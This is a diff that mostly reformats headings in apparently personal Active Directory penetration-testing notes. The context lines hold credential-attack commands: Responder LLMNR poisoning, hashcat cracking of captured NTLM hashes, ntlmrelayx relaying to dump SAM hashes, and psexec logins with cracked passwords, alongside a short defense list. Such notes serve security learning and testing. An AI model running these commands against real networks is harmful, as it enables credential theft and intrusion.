@@ -44,7 +44,7 @@ Transitive Trust: the trust relationship is extended beyond a two-domain trust t
 **********************
 
 # Attacking:
-## Data Store:
+### Data Store:
 ```
 %SystemRoot%\NTDS\Ntds.dit
 C:\Windows\NTDS\Ntds.dit
@@ -53,7 +53,7 @@ always check for this file and grab it. only accessible through the domian contr
 
 
 ## LLMNR Poisoning: 
-### Responder:
+#### Responder:
 gather hashes over the network passively 
 ```
 sudo python /usr/share/responder/Responder.py -I eth0 -rdw -v 
@@ -67,7 +67,7 @@ sudo python /usr/share/responder/Responder.py -I eth0 -rdw -v
 ```
 save hashses to file called hashes.txt
 
-### Hashcat:
+#### Hashcat:
 using the password file rockyou.txt and the NTLM module to crack passwords
 ```
 hashcat -m 5600 hashes.txt rockyou.txt --force
@@ -94,7 +94,7 @@ $ hashcat --help | grep SHA
 ```
 
 
-## LLMNR Poisoning Defense:
+##### LLMNR Poisoning Defense:
 1. Disable LLMNR
 2. Disable NBT-NS
 3. Require Network Access Control
@@ -109,7 +109,7 @@ HTTP = Off
 ```
 everything else stays on
 
-### NMAP
+#### NMAP
 check for open SMB port and check for SMB signing
 ```
 sudo nmap --script=smb2-security-mode.nse -p445 192.168.1.0/24
@@ -130,7 +130,7 @@ ntmlrelayx.py -tf targets.txt -smb2support -i
 ```
 looking for it to dump SAM hashes or give you and SMB client shell for the known user. can use MSFvenom to create an executable payload and get reverse shell. or create a powershell script or CMD to run as a command to get a reverse shell or do something. 
 
-### connecting: requires having cracked a hash
+#### connecting: requires having cracked a hash
 1. can use MSFconsole to attack the tartget using exploit/windows/smb/psexec
 2. if that is getting stopped by antivirus try psexec.py 
 ``` psexec.py <domain>.local/<user>:<password>@<ip-address> ```
@@ -376,8 +376,6 @@ Ace:{
 }
 
 ```
-## IPv6 Defense:
-
 
 ## DNS take over:
 
